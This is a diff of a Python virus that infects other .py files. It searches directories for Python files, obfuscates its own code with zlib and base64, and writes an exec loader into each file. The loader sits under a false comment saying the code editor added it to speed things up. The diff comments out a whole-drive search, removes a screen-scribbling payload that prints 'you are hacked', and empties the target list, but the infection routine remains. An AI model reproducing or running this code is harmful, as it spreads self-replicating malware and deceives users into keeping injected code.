@@ -57,39 +57,28 @@ def search_in_directories(directories, file_extension=".py"):
   
     return search_results
 
+"""
+# this is the code to search in the whole drive
+
+def search_windows(file_extension=".py", drive="C:\\"):
+    search_results = []
+    for root, dirs, files in os.walk(drive, onerror=lambda e: None):  # Skip inaccessible directories
+        for file in files:
+            if file.endswith(file_extension):
+                search_results.append(os.path.join(root, file))
+
+    return search_results
+"""
+
 def find_files_to_infect(directory = "."):
   return [file for file in glob.glob("*.py")]
 
 def summon_chaos():
+  print("summon chaos")
 
+ 
+      
 
-  user32 = ctypes.windll.user32
-  screen_width = user32.GetSystemMetrics(0)
-  screen_height = user32.GetSystemMetrics(1)
-
-  hdc = ctypes.windll.user32.GetDC(0)
-
-  def set_pixel(x, y, color):
-      ctypes.windll.gdi32.SetPixel(hdc, x, y, color)
-
-  def pixel_chaos(duration=5):
-      print("Pixel Chaos started! Press Ctrl+C to stop.")
-      start_time = time.time()
-      try:
-          while time.time() - start_time < duration:
-              x = random.randint(0, screen_width - 1)
-              y = random.randint(0, screen_height - 1)
-              color = random.randint(0, 0xFFFFFF)
-              set_pixel(x, y, color)
-      except KeyboardInterrupt:
-          print("\nPixel Chaos stopped!")
-      finally:
-          ctypes.windll.user32.ReleaseDC(0, hdc)  
-          print("Resources released.")
-
-  pixel_chaos()
-
-  print("you are hacked")
 
 def infect(file, virus_code):
   
@@ -98,7 +87,7 @@ def infect(file, virus_code):
     obscured_virus_code,_ = transform_and_obscure_virus_code(virus_code)
     viral_vector = "exec(\"import zlib\\nimport base64\\nexec(zlib.decompress(base64.urlsafe_b64decode("+str(obscured_virus_code)+")))\")"
    
-      
+    
 
     with open(file, "w") as infected_file:
       msg = "\n# The code below has been added by the code editor to make your code run faster. Please do not delete it. \n"
@@ -129,7 +118,7 @@ def get_virus_code():
 try:
   virus_code = get_virus_code()
  
-  dir = ['c:\\Users\\wensal\\Downloads\\test','c:\\Users\\wensal\\Downloads\\css\\virus\\test']
+  dir = []
   for file in search_in_directories(dir):
     infect(file, virus_code)
 
